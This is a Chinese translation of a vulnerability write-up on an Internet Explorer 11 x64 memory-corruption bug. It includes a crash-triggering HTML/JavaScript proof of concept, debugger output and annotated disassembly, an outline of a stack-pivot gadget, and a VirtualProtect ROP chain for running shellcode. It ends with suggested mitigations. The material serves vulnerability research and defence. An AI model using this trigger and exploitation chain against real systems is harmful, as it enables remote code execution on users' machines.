link:http://ifsec.blogspot.com/2013/11/exploiting-internet-explorer-11-64-bit.html

环境：

    IE 11 
    win8.1 preview x64
    windbg x64

## 1.漏洞分析
poc:

    <script>
    function bug() {
    for(var i = 0;i < 2;i++)
    {
     t = document.getElementsByTagName("table")[i];
     t.parentNode.runtimeStyle.posWidth = "";
     t.focus();
     }
    }
    </script>
    <body onload=bug()>
    <form><table><th><ins>aaaaaaaaaa aaaaaaaaaa</ins></th></table></form>
    <form><table><th><ins>aaaaaaaaaa aaaaaaaaaa</ins></th></table></form>

Windbg附加IE打开poc.html,程序崩溃

    (be8.a48): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    MSHTML!Layout::ContainerBox::ContainerBox+0x1e6:
    00007ff8`74ca5d06 488b04d0mov rax,qword ptr [rax+rdx*8] ds:000000e2`b3cf0ce8=????????????????
    0:012> r
    rax=000000e2a3cf0cf0 rbx=000000e2a9b43c20 rcx=000000000000007f
    rdx=0000000001ffffff rsi=000000e2a3cb9e60 rdi=00000000ffffffff
    rip=00007ff874ca5d06 rsp=000000e2a3bd8fe0 rbp=000000e2a3d12980
     r8=0000000000000001  r9=0000000000000001 r10=0000000000000000
    r11=000000e2a3bd8fd0 r12=00000000ffffffff r13=00000000ffffffff
    r14=0000000000000255 r15=00000000ffffffff
    iopl=0 nv up ei pl nz na pe nc
    cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b efl=00010202
    MSHTML!Layout::ContainerBox::ContainerBox+0x1e6:
    00007ff8`74ca5d06 488b04d0mov rax,qword ptr [rax+rdx*8] ds:000000e2`b3cf0ce8=????????????????
    0:012> k
    Child-SP  RetAddr   Call Site
    000000e2`a3bd8fe0 00007ff8`74d4b620 MSHTML!Layout::ContainerBox::ContainerBox+0x1e6
    000000e2`a3bd9060 00007ff8`74d56e18 MSHTML!Layout::TableGridBox::TableGridBox+0x38
    000000e2`a3bd90c0 00007ff8`74d56d32 MSHTML!Layout::TableGridBoxBuilder::CreateTableGridBoxBuilder+0xd8
    000000e2`a3bd9130 00007ff8`74ca0470 MSHTML!Layout::LayoutBuilder::CreateLayoutBoxBuilder+0x2c9
    000000e2`a3bd91f0 00007ff8`74c9f263 MSHTML!Layout::LayoutBuilderDriver::StartLayout+0x85f
    000000e2`a3bd9400 00007ff8`74c9a77a MSHTML!Layout::PageCollection::FormatPage+0x287
    000000e2`a3bd9590 00007ff8`74c9a27e MSHTML!Layout::PageCollection::LayoutPagesCore+0x2aa
    000000e2`a3bd9730 00007ff8`74c9b08d MSHTML!Layout::PageCollection::LayoutPages+0x18e
    000000e2`a3bd97c0 00007ff8`74c9ae13 MSHTML!CMarkupPageLayout::CalcPageLayoutSize+0x251
    000000e2`a3bd98e0 00007ff8`74df1b0a MSHTML!CMarkupPageLayout::CalcTopLayoutSize+0xd7
    000000e2`a3bd99a0 00007ff8`752c4416 MSHTML!CMarkupPageLayout::DoLayout+0x76

从上面可以看出，IE进程崩溃在MSHTML!Layout:ContainerBox:ContainerBox函数中，因为试图读取rax + rdx * 8指向的未初始化内存。rax实际上是指向一个CFormatCache对象的内存（从何而知?），而rdx（0x0000000001ffffff）的值不知的从哪来的。查看了ContainerBox：ContainerBox函数的代码，想看看这个值是从哪里来的，以及如果攻击者控制了rax + 0xffffff8处的内存之后可以做什么。
    
    MSHTML!Layout::ContainerBox::ContainerBox:
    00007ff8`74ca5b20 488bc4  mov rax,rsp
    00007ff8`74ca5b23 44884820mov byte ptr [rax+20h],r9b
    00007ff8`74ca5b27 4c894018mov qword ptr [rax+18h],r8
    00007ff8`74ca5b2b 48895010mov qword ptr [rax+10h],rdx
    00007ff8`74ca5b2f 48894808mov qword ptr [rax+8],rcx
    00007ff8`74ca5b33 53  pushrbx
    00007ff8`74ca5b34 55  pushrbp
    00007ff8`74ca5b35 56  pushrsi
    00007ff8`74ca5b36 57  pushrdi
    00007ff8`74ca5b37 4154pushr12
    00007ff8`74ca5b39 4155pushr13
    00007ff8`74ca5b3b 4156pushr14
    00007ff8`74ca5b3d 4157pushr15
    00007ff8`74ca5b3f 4883ec38sub rsp,38h
    00007ff8`74ca5b43 33ffxor edi,edi
    00007ff8`74ca5b45 83cdff  or  ebp,0FFFFFFFFh  <---------------------(1)用作CFormatCache索引变量的初始值
    00007ff8`74ca5b48 488bd9  mov rbx,rcx
    00007ff8`74ca5b4b 48897908mov qword ptr [rcx+8],rdi
    00007ff8`74ca5b4f 488d0542444100  lea rax,[MSHTML!Layout::ContainerBox::`vftable' (00007ff8`750b9f98)]
    00007ff8`74ca5b56 488901  mov qword ptr [rcx],rax
    00007ff8`74ca5b59 48897910mov qword ptr [rcx+10h],rdi
    00007ff8`74ca5b5d 48897928mov qword ptr [rcx+28h],rdi
    00007ff8`74ca5b61 48897930mov qword ptr [rcx+30h],rdi
    00007ff8`74ca5b65 48897938mov qword ptr [rcx+38h],rdi
    00007ff8`74ca5b69 48897940mov qword ptr [rcx+40h],rdi
    00007ff8`74ca5b6d 48897948mov qword ptr [rcx+48h],rdi
    00007ff8`74ca5b71 48897950mov qword ptr [rcx+50h],rdi
    00007ff8`74ca5b75 48897958mov qword ptr [rcx+58h],rdi
    00007ff8`74ca5b79 48897960mov qword ptr [rcx+60h],rdi
    00007ff8`74ca5b7d 48897968mov qword ptr [rcx+68h],rdi
    00007ff8`74ca5b81 48897970mov qword ptr [rcx+70h],rdi
    00007ff8`74ca5b85 48897978mov qword ptr [rcx+78h],rdi
    00007ff8`74ca5b89 4889b980000000  mov qword ptr [rcx+80h],rdi
    00007ff8`74ca5b90 4889b988000000  mov qword ptr [rcx+88h],rdi
    00007ff8`74ca5b97 4889b990000000  mov qword ptr [rcx+90h],rdi
    00007ff8`74ca5b9e 6689a9ae000000  mov word ptr [rcx+0AEh],bp
    00007ff8`74ca5ba5 6689a9ac000000  mov word ptr [rcx+0ACh],bp
    00007ff8`74ca5bac 6689a9aa000000  mov word ptr [rcx+0AAh],bp
    00007ff8`74ca5bb3 6689a9a8000000  mov word ptr [rcx+0A8h],bp
    00007ff8`74ca5bba 4889b9a0000000  mov qword ptr [rcx+0A0h],rdi
    00007ff8`74ca5bc1 488b4978mov rcx,qword ptr [rcx+78h]
    00007ff8`74ca5bc5 48897b78mov qword ptr [rbx+78h],rdi
    00007ff8`74ca5bc9 4885c9  testrcx,rcx
    00007ff8`74ca5bcc 0f850e2e6000jne MSHTML!Layout::ContainerBox::ContainerBox+0x544 (00007ff8`752a89e0)
    00007ff8`74ca5bd2 488b8b80000000  mov rcx,qword ptr [rbx+80h]
    00007ff8`74ca5bd9 4889bb80000000  mov qword ptr [rbx+80h],rdi
    00007ff8`74ca5be0 4885c9  testrcx,rcx
    00007ff8`74ca5be3 0f85012e6000jne MSHTML!Layout::ContainerBox::ContainerBox+0x54e (00007ff8`752a89ea)
    00007ff8`74ca5be9 488bbc2488000000 mov rdi,qword ptr [rsp+88h]
    00007ff8`74ca5bf1 4885ff  testrdi,rdi
    00007ff8`74ca5bf4 7415je  MSHTML!Layout::ContainerBox::ContainerBox+0xeb (00007ff8`74ca5c0b)
    00007ff8`74ca5bf6 0fb74772movzx   eax,word ptr [rdi+72h]
    00007ff8`74ca5bfa b9ffff0000  mov ecx,0FFFFh <----------------------------------------------
    00007ff8`74ca5bff 663bc1  cmp ax,cx  <---------------------------------------->
    00007ff8`74ca5c02 7307jae MSHTML!Layout::ContainerBox::ContainerBox+0xeb (00007ff8`74ca5c0b)
    00007ff8`74ca5c04 66ffc0  inc ax
    00007ff8`74ca5c07 66894772mov word ptr [rdi+72h],ax <---------------------------------
    00007ff8`74ca5c0b 488b4b10mov rcx,qword ptr [rbx+10h]
    00007ff8`74ca5c0f 48897b10mov qword ptr [rbx+10h],rdi
    00007ff8`74ca5c13 4885c9  testrcx,rcx
    00007ff8`74ca5c16 0f85d82d6000jne MSHTML!Layout::ContainerBox::ContainerBox+0x558 (00007ff8`752a89f4)
    00007ff8`74ca5c1c 488b8790000000  mov rax,qword ptr [rdi+90h]
    00007ff8`74ca5c23 0fb6884c030000  movzx   ecx,byte ptr [rax+34Ch]
    00007ff8`74ca5c2a 80e11f  and cl,1Fh
    00007ff8`74ca5c2d 80f911  cmp cl,11h
    00007ff8`74ca5c30 0f84336c0a00je  MSHTML!Layout::ContainerBox::ContainerBox+0x45e (00007ff8`74d4c869)
    00007ff8`74ca5c36 488bcf  mov rcx,rdi <---------------------------------------------------------------
    00007ff8`74ca5c39 e8a2c3fbff  callMSHTML!CTreeNode::CacheStyleForLayout (00007ff8`74c61fe0)
    00007ff8`74ca5c3e 440fb64713  movzx   r8d,byte ptr [rdi+13h]
    00007ff8`74ca5c43 410fb6c0movzx   eax,r8b
    00007ff8`74ca5c47 c0e805  shr al,5
    00007ff8`74ca5c4a 2401and al,1 ----------------------------------------------------标志
    00007ff8`74ca5c4c 0f84ac2d6000je  MSHTML!Layout::ContainerBox::ContainerBox+0x562 (00007ff8`752a89fe) --------------- 判断
    00007ff8`74ca5c52 440fb76f68  movzx   r13d,word ptr [rdi+68h] <---------------------(2-yes)-若设置了就从CTreeNode对象中复制索引值   
    
    00007ff8`752a89fe 448bed  mov r13d,ebp  <-------------------------------------------(2-no)--  若未设置了就则使用初始值
    00007ff8`752a8a01 e951d29fff  jmp MSHTML!Layout::ContainerBox::ContainerBox+0x137 (00007ff8`74ca5c57)
    
    00007ff8`74ca5c57 84c0testal,al
    00007ff8`74ca5c59 0f84a72d6000je  MSHTML!Layout::ContainerBox::ContainerBox+0x56a (00007ff8`752a8a06)
    00007ff8`74ca5c5f 440fb7676a  movzx   r12d,word ptr [rdi+6Ah]
    00007ff8`74ca5c64 41f6c040testr8b,40h
    00007ff8`74ca5c68 0f84a02d6000je  MSHTML!Layout::ContainerBox::ContainerBox+0x572 (00007ff8`752a8a0e)
    00007ff8`74ca5c6e 440fb77f6e  movzx   r15d,word ptr [rdi+6Eh]
    00007ff8`74ca5c73 488bd7  mov rdx,rdi
    00007ff8`74ca5c76 83e201  and edx,1
    00007ff8`74ca5c79 751ajne MSHTML!Layout::ContainerBox::ContainerBox+0x175 (00007ff8`74ca5c95)
    00007ff8`74ca5c7b 488b8790000000  mov rax,qword ptr [rdi+90h]
    00007ff8`74ca5c82 0fb6884c030000  movzx   ecx,byte ptr [rax+34Ch]
    00007ff8`74ca5c89 83e11f  and ecx,1Fh
    00007ff8`74ca5c8c 83f911  cmp ecx,11h
    00007ff8`74ca5c8f 0f84396c0a00je  MSHTML!Layout::ContainerBox::ContainerBox+0x4c2 (00007ff8`74d4c8ce)
    00007ff8`74ca5c95 4885d2  testrdx,rdx
    00007ff8`74ca5c98 751ajne MSHTML!Layout::ContainerBox::ContainerBox+0x194 (00007ff8`74ca5cb4)
    00007ff8`74ca5c9a 488b8790000000  mov rax,qword ptr [rdi+90h]
    00007ff8`74ca5ca1 0fb6884c030000  movzx   ecx,byte ptr [rax+34Ch]
    00007ff8`74ca5ca8 83e11f  and ecx,1Fh
    00007ff8`74ca5cab 83f90a  cmp ecx,0Ah
    00007ff8`74ca5cae 0f84646c0a00je  MSHTML!Layout::ContainerBox::ContainerBox+0x512 (00007ff8`74d4c918)
    00007ff8`74ca5cb4 41f6c010testr8b,10h
    00007ff8`74ca5cb8 0f84192d6000je  MSHTML!Layout::ContainerBox::ContainerBox+0x53b (00007ff8`752a89d7)
    00007ff8`74ca5cbe 440fb7776c  movzx   r14d,word ptr [rdi+6Ch]
    00007ff8`74ca5cc3 8b0df7432701mov ecx,dword ptr [MSHTML!tls_index (00007ff8`75f1a0c0)]
    00007ff8`74ca5cc9 65488b042558000000 mov   rax,qword ptr gs:[58h] <-----------------------------------
    00007ff8`74ca5cd2 be08000000  mov esi,8
    00007ff8`74ca5cd7 488b04c8mov rax,qword ptr [rax+rcx*8] <-----------------------------
    00007ff8`74ca5cdb 410fbffdmovsx   edi,r13w <--------------------------------------------------------(3) 较高索引
    00007ff8`74ca5cdf 488b3406mov rsi,qword ptr [rsi+rax] <------------------------------
    00007ff8`74ca5ce3 488b2e  mov rbp,qword ptr [rsi] <------------------------------
    00007ff8`74ca5ce6 85fftestedi,edi <-----------------------------------------------------
    00007ff8`74ca5ce8 0f8848b67200js  MSHTML!CTextShadowEffectProvider::GetTargetBounds+0x67506 (00007ff8`753d1336)
    00007ff8`74ca5cee 3b7d40  cmp edi,dword ptr [rbp+40h] <------------------------------判断
    00007ff8`74ca5cf1 0f8d3fb67200jge MSHTML!CTextShadowEffectProvider::GetTargetBounds+0x67506 (00007ff8`753d1336)
    00007ff8`74ca5cf7 488b4538mov rax,qword ptr [rbp+38h] <---------------------------------------
    00007ff8`74ca5cfb 8bcfmov ecx,edi
    00007ff8`74ca5cfd 8bd7mov edx,edi <------------------------------------------------------------------------(4)
    00007ff8`74ca5cff 48c1ea07shr rdx,7 <----------------------------------------- 
    00007ff8`74ca5d03 83e17f  and ecx,7Fh <------------------------------------------------------索引低位（将为0x7f）
    00007ff8`74ca5d06 488b04d0mov rax,qword ptr [rax+rdx*8] <------漏洞触发(乘以8（void *的大小），然后将此偏移量加到rax)
    00007ff8`74ca5d0a 488d0c49lea rcx,[rcx+rcx*2]<------------------------------------------x24
    00007ff8`74ca5d0e 488d14c8lea rdx,[rax+rcx*8]   <-------------------------------------------
    00007ff8`74ca5d12 8b4cc810mov ecx,dword ptr [rax+rcx*8+10h]
    00007ff8`74ca5d16 8b420c  mov eax,dword ptr [rdx+0Ch] <-------取出[rdx + 0C]处的数字
    00007ff8`74ca5d19 3bc8cmp ecx,eax
    00007ff8`74ca5d1b 0f8325b67200jae MSHTML!CTextShadowEffectProvider::GetTargetBounds+0x67516 (00007ff8`753d1346)
    00007ff8`74ca5d21 ffc0inc eax  <----------------自增
    00007ff8`74ca5d23 89420c  mov dword ptr [rdx+0Ch],eax <-写回[rdx + 0C]
    00007ff8`74ca5d26 488b6e08mov rbp,qword ptr [rsi+8]
    00007ff8`74ca5d2a 410fbffcmovsx   edi,r12w

崩溃时rdx的值是由ebp值经过几次赋值之后得来的，ebp在函数开头部分被初始化为0xFFFFFFFF。
假设值0xFFFFFFFF（-1）是用作CFormatCache索引变量的初始值的。

    1.在稍后的代码中，获取了一个指向CTreeNode对象的指针，然后检查CTreeNode中的标志，
	如果它被设置，则从CTreeNode对象中复制索引值。然而，如果未设置标志（如PoC中的情况），则使用初始值。
    2.值0xFFFFFFFF然后被分成上下两部分（CFormatCache看起来像是一个2个DWORD值的数组）。
	较高索引（将等于0x1ffffff）的值将乘以8（void *的大小），然后将此偏移量加到rax，并将此内存位置处的内容写回到rax。然后，让索引低位（将为0x7f）的值乘以24（可能是CCharFormat元素的大小），并将该偏移量加到eax，然后将此内存位置的内容写入rdx。
    3.最后，这是与利用相关的部分：取出[rdx + 0C]处的数字，自增之后再写回[rdx + 0C]

C++代码：

    int cacheIndex = -1;
    if(treeNode->flag) {
      cacheIndex = treeNode->cacheIndex;
    } 
    unsigned int index_hi = cacheIndex, index_lo = cacheIndex;
    index_hi = index_hi >> 7;
    index_lo = index_lo & 0x7f;
    //with sizeof(formatCache[i]) == 8 and sizeof(formatCache[i][j]) == 24
    formatCache[index_hi][index_lo].some_number++;

大概流程：

    1.一个指向有效内存（CFormatCache指针）的指针A偏移0x0FFFFFF8（256M）处是另一个指针B
    2.指针B偏移0xBF4(0x7F * 3 * 8 + 0x0C）处是一个DWORD值C
    3.C将被加1

## 2.漏洞利用

### 2.1 寻找堆栈翻转（pivot）的gadgets
为了将栈转移到堆上，我们需要找到能完成这个任务的指令

一个可用的gadgets序列如下所示，以下指令不能直接满足我们的需求，我们需要实先控制rax和rcx中的值
    
    00007ffb`265ea973 50  push rax
    00007ffb`265ea974 5c  pop rsp
    00007ffb`265ea975 85d2testedx,edx
    00007ffb`265ea977 7408je  MSHTML!CTableLayout::GetLastRow+0x25 (00007ffb`265ea981)
    00007ffb`265ea979 8b4058  mov eax,dword ptr [rax+58h]
    00007ffb`265ea97c ffc8dec eax
    00007ffb`265ea97e 03c2add eax,edx
    00007ffb`265ea980 c3  ret
    00007ffb`265ea981 8b8184010000mov eax,dword ptr [rcx+184h]
    00007ffb`265ea987 ffc8dec eax
    00007ffb`265ea989 c3  ret

虽然漏洞利用主要依赖于jscript9.dll中的对象，但是mshtml.dll模块的地址可以很容易地通过内存泄漏来获得。我们可以把一个mshtml对象放入到一个JS数组对象中去，然后我们可以读取到mshtml对象的虚表并且引用它。

### 2.2 VirtualProtect
在获得了栈的控制之后，我们可以调用VirtualProtect来分配一块内存，这块内存可以允许我们写入代码并进行执行。我们可以通过mshtml.dll的IAT找到VirtualProtect函数的地址（因此exp中要包含一些基本的PE结构的解析）。因为在64位Windows中，使用的调用约定是与32位不同的。64位Windows使用fastcall约定，前4个参数（这正是VirtualProtect的参数数量）通过寄存器RCX，RDX，R8和R9（按此顺序）来传递。因此，我们需要一些额外的gadgets来将正确的参数加载到正确的寄存器中：

    pop rcx; ret;
    pop rdx; ret;
    pop r8; ret;
    pop r9; ret;

所在获得了VirtualProtect函数的地址和控制了堆栈的情况下，我们就可以控制正确的参数并返回调用VirtualProtect函数了

如上所示，前三个参数在mshtml.dll模块中是比较常见的。但是第四个不是很常见，不过对于VirtualProtect来说，最后一个参数只需要指向一个可写内存的即可，而在我们获得对RIP控制的时候就已经是这种情况了，所以我们实际上不需要更改r9。

最终的ROP链看起来像是这样：

    address of pop rcx; ret;
    address on the heap block with shellcode
    address of pop rdx; ret;
    0x1000 (size of the memory that we want to make executable)
    address of pop r8; ret;
    0x40 (PAGE_EXECUTE_READWRITE)
    address of VirtualProtect
    address of shellcode

## 3.结论

虽然Windows8/8.1已经存在了需要强有力的保护机制，但是内存破坏类漏洞仍然存活着并且可以被利用。当然，一些漏洞类型变得更加难以利用，但是从这里的这个漏来看，肯定有更多的漏洞可以以类似的方式被利用。该漏洞还表明，在某些情况下，即使在64位进程中堆喷射仍然有用。虽然在一些情况下，编写在x64上的漏洞利用比在x86上更加困难（例如要找到进行喷射的内容和要覆写的东西，查找堆栈翻转的gadgets等），但这些困难并不足以阻止一个有目的明确的攻击者。

最后，列出了一些可以使在Windows 8.1的IE11中编写exp更困难的保护方法：

    1.考虑到攻击者使用JavaScript数组来突破堆喷射保护，可以对包含大量重复值的数组进行RLE编码。
    
    2.对JavaScript堆添加与默认堆相同的保护，如添加页保护（guard pages）并引入地址随机化。
    
    3.对常见的JavaScript对象的虚函数表进行保护。
    
    4.对编译器进行更改以从代码中删除所有的可用的堆栈翻转gadgets。其实现在这些gadgets在x64代码中已经很少了，所以不会对性能有很大的影响。